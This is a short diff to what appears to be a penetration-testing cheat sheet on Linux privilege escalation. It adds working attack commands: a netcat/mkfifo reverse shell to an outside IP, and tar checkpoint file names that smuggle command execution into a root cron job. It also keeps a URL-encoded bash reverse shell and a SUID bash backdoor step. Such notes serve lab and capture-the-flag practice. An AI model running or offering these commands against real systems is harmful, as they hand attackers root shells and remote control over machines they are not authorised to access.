@@ -46,6 +46,13 @@ bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F10%2E10%2E100%2E1%2F666%200%3E%261
 ```shell
 # Add the following to a file that is runned as root to obtain a shell
 echo "cp /bin/bash /tmp && chmod +s /tmp/bash" >> /etc/FILE.sh
+
+
+# Also, if the user root is running a cron job u can put this code into a file and obtain root shell
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.11.74.136 777 > /tmp/f
+## The perform:
+echo > '--checkpoint=1'
+echo > '--checkpoint-action=exec=sh shell.sh'
 ```
 
 - When the script will be executed, it will copy the `/bin/bash` to `/tmp` directory and make it a SUID.
